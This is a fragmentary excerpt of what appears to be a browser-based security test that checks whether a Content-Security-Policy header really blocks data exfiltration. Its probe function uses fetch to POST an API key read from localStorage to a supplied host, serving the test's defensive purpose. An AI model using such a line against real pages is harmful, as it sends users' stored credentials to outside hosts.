 ...
 * different claim from the policy being enforced — a typo'd directive name, a
 * malformed header, or a Pages config that strips the header would all leave
 * check 6 green with nothing actually blocking. So this gate runs a real
 * exfiltration attempt in a real browser against the real header.
 *
...
const probe = (host) => page.evaluate(async (h) => {
  ...
  try { await fetch(h + '/v1/x', { method: 'POST', body: 'k=' + (localStorage.getItem('planet-express-lounge:apiKey') || 'none') }); }
